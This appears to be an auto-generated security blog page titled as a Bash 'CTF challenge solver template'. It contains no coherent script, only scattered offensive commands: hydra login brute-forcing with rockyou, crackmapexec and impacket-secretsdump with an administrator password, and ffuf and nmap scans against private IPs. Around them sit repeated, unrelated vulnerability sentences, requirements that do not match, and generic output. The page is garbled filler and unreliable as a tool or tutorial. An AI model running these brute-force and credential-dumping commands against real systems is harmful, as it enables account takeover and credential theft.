---
TitleSEO: "CTF Challenge Solver Template in Bash | ZureFX"
TitlePost: "CTF Challenge Solver Template — Bash"
Author: "ZureFX"
Description: "A Bash script for ctf challenge solver template. Built for security research and automation."
Keywords: "tool, parser, scanner, bash"
URL: "https://zurefx.github.io/scripting/script-ctf-challenge-solver-template-805.html"
URL_IMAGES: ""
Date: "2024-02-08"
Tags: "Tool, Parser, Scanner, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-ctf-challenge-solver-template-805"
Permalink: "/scripting/script-ctf-challenge-solver-template-805.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `john`
- `crackmapexec`
- `feroxbuster`

## Implementation

### Core Logic

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.123.71 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.84.162.208/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.4.68/FUZZ
```

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.163.213/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.127.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.106.131.254 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.45.62.7 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.110.66/FUZZ
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.114.4.152
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.164.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p445,27017,995 10.26.231.23 -oN scan.txt
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 6.38s
```
